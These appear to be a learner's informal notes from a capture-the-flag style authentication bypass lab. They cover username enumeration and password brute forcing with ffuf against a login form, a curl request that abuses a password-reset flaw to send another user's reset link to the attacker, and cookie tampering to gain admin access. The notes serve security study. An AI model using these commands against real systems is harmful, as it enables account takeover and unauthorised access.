authentication bypass

errors sometimes gives us clues

supposingly if an error message says USERNAME EXISTS --so using this quote we can try numerous of username to se matches using ffuf

/Rooms/caldera/caldera/plugins/atomic/data/atomic-red-team/atomics/T1087.002/src..this is wher my files have been saved  I mean username.txt

learn how to store the output properly in a file only usernames wala


so till now we learnt that ffuf can help us find usernames based on the error messages--check the command


lets now brute force these in the login of customer 


echo -e "steve\nrobert\nsimon" > /root/Valid_username.txt||remember this new command

A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.


ffuf -w Valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.138.195/customers/login -fc 200

using above command we found login credentials

logic flaws in authentication mechanisim

while the intended part may be 1-2-3-4===a hacker would 1---4

example if exactly admin has been filtered and bloced to be accesed then a hacker ay try Admin



-----------------------------------------
curl 'http://10.10.195.6/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'||making of an request||learn curl


using the misconfiguration we were able to share the resent link of one user to ours email



-------------------------------------------------
cookie manipulation can have many outcomes--authbypass

plain text--cookie

Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/


cookie manipulation 
curl http://10.10.253.186/cookie-test ||simple webpage request

look how -h flags help us fit  queries

curl -H "Cookie: logged_in=true; admin=false" http://10.10.253.186/cookie-test


Sometimes cookie values can look like a long string of random characters; these are called hashes 

md5||sha-256||sha-512||sha1

services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.

encoding binary data to human-readable-text--for safe transmisions
Common encoding types are base32 which converts binary data to the characters A-Z and 2-7,
 base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.(padding?space)
